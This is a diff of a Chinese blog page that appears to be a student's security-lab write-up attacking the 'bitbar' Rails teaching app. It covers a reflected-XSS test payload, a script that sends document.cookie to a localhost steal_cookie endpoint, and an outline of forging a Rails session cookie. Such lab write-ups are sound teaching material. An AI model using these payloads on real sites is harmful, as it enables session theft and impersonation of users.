@@ -192,19 +192,13 @@
                         </span>
                     
                     
-                        <span class="post-category">
-                    Category:
-                            
-                                <a href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
-                            
-                        </span>
-                    
                 </div>
             
         </header>
 
         <div class="post-content">
-            <h1 id="安装Ruby-on-Rails"><a href="#安装Ruby-on-Rails" class="headerlink" title="安装Ruby on Rails"></a>安装Ruby on Rails</h1><p>Ruby on Rails 是一个用于开发以数据库为后台的 web 应用程序的开源 web 框架。其为发挥程序员持久的生产力而优化，因为它能让程序员通过有益的约定而不是配置来编写代码。 </p>
+            <p>title: 网安实验攻击bitbar网站<br>categories: web前端<br>date: 2020-05-14 20:24:46<br>tags: web安全</p>
+<h1 id="安装Ruby-on-Rails"><a href="#安装Ruby-on-Rails" class="headerlink" title="安装Ruby on Rails"></a>安装Ruby on Rails</h1><p>Ruby on Rails 是一个用于开发以数据库为后台的 web 应用程序的开源 web 框架。其为发挥程序员持久的生产力而优化，因为它能让程序员通过有益的约定而不是配置来编写代码。 </p>
 <p>实验环境：ubuntu 16.04 ,ruby 2.5.8 ,rail 5.0.7.2</p>
 <p><a href="http://gorails.com/setup/ubuntu/16.04" target="_blank" rel="noopener">http://gorails.com/setup/ubuntu/16.04</a></p>
 <p>安装rail时出现了一个问题：</p>
@@ -227,14 +221,10 @@
 <h1 id="attack1-：-cookie-theft"><a href="#attack1-：-cookie-theft" class="headerlink" title="attack1 ： cookie theft"></a>attack1 ： cookie theft</h1><p>这里解释的比较清楚，从<a href="https://www.techopedia.com/definition/24633/cookie-theft摘下来。" target="_blank" rel="noopener">https://www.techopedia.com/definition/24633/cookie-theft摘下来。</a></p>
 <p> By mimicking a person’s cookie over the same network, a hacker can access sites and perform malicious actions. Depending on the sites accessed while the hacker is monitoring the network, this could be anything from <strong>making false posts in that individual’s name</strong> to <strong>transferring money out of a bank account.</strong> Hacking software has made it easier for hackers to carry out these attacks by monitoring the packets going back and forth. <strong><em>Cookie theft can be avoided by only logging in over SSL connections or employing HTTPS protocol to encrypt the connection. Otherwise, it is best not to access sites over unsecured networks.</em></strong> </p>
 <p>漏洞原理：XSS反射性漏洞</p>
-<p>1.验证有xss漏洞的脚本</p>
-<script>alert(/xss/)</script>
-
+<p>1.验证有xss漏洞的脚<script>alert(/xss/)</script></p>
 <p>提交后执行弹窗“/xss/”</p>
 <p>2.实现窃取cookie的脚本</p>
-  <script type="text/javascript">(new Image()).src="http://localhost:3000/steal_cookie?cookie="+document.cookie</script>  
-
-<p>然后访问<a href="http://localhost:3000/view_stolen_cookie" target="_blank" rel="noopener">http://localhost:3000/view_stolen_cookie</a>  ，得到cookie</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;(new Image()).src=&quot;http://localhost:3000/steal_cookie?cookie=&quot;+document.cookie&lt;/script&gt;  </code></pre><p>然后访问<a href="http://localhost:3000/view_stolen_cookie" target="_blank" rel="noopener">http://localhost:3000/view_stolen_cookie</a>  ，得到cookie</p>
 <h1 id="attack2：Session-hijacking-with-Cookies"><a href="#attack2：Session-hijacking-with-Cookies" class="headerlink" title="attack2：Session hijacking with Cookies"></a>attack2：Session hijacking with Cookies</h1><p>用别人的cookie，提交请求，冒充别人。</p>
 <p>首先了解cookie的生成逻辑，然后逆向解释出attacker的cookie所代表的的含义，从最原始的信息里修改为user1有关的cookie，再正向拼接初始向量iv的base64编码，最终形成cookie，替换掉原来的cookie值，提交表单，得到服务器的响应。</p>
 <h3 id="Ruby：Mechanize的使用教程"><a href="#Ruby：Mechanize的使用教程" class="headerlink" title="Ruby：Mechanize的使用教程"></a><a href="https://www.cnblogs.com/hongfei/p/3699029.html" target="_blank" rel="noopener">Ruby：Mechanize的使用教程</a></h3><h3 id="Rails-Cookie-如何解密"><a href="#Rails-Cookie-如何解密" class="headerlink" title="Rails Cookie 如何解密"></a><a href="https://ruby-china.org/topics/34235" target="_blank" rel="noopener">Rails Cookie 如何解密</a></h3><h3 id="http-prontosil-me-posts-bc703cb4"><a href="#http-prontosil-me-posts-bc703cb4" class="headerlink" title="http://prontosil.me/posts/bc703cb4/"></a><a href="http://prontosil.me/posts/bc703cb4/" target="_blank" rel="noopener">http://prontosil.me/posts/bc703cb4/</a></h3><p>最终脚本：</p>
@@ -284,10 +274,6 @@
                 <span>Tag(s):</span>
                 <span class="tag">
                     
-                    
-                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
-                    
-                        
                 </span>
             </div>
             <div>
